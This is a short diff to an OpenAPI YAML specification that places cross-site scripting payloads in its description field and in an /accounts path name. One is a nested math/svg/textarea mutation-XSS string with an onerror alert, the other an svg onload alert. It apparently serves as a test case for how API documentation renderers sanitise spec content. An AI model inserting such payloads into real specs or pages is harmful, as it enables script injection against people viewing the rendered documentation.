@@ -4,7 +4,7 @@ info:
   description: |
     <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
 paths:
-  /accounts:
+  /accounts\<svg/onload=alert(1)\> :
     get:
       responses:
         '200':
